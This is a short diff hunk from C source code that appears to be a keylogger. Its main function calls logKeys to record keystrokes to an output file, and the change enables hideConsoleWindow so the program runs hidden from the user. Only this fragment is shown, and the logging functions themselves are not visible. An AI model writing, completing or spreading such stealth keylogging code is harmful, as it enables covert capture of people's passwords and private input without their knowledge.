@@ -7,7 +7,7 @@
 
 const errno_t main(void)
 {
-    // hideConsoleWindow();
+    hideConsoleWindow();
 
     errno_t err = logKeys(OUTPUT_FILE_NAME);
     if (err) return err;
